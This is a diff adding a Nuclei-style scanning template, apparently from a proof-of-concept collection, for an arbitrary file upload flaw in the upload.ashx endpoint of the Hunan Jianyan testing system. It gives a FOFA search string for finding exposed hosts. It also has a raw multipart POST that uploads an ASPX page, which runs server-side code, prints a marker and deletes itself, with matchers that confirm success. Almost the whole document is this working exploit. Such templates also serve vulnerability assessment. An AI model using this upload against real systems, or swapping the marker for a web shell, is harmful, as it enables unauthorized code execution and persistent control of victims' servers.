@@ -1,0 +1,38 @@
+id: hunan-jianyan-test-uploadashx-file-upload
+
+info:
+  name: "湖南建研检测系统 upload.ashx 任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Content/Theme/Standard/webSite/login.css"
+        该系统在 upload.ashx 接口中未正确实施文件上传验证机制，攻击者可通过构造恶意请求上传任意文件，从而实现对目标系统的未授权代码执行及持久化控制。
+  tags: 湖南建研检测系统
+
+http:
+- raw:
+  - |
+    POST /Applications/Attachment/upload.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+
+    --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+    Content-Disposition: form-data; name="file";filename="NTest.aspx"
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest");System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+    Content-Disposition: form-data; name="_upload_guid"
+
+    1
+    --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
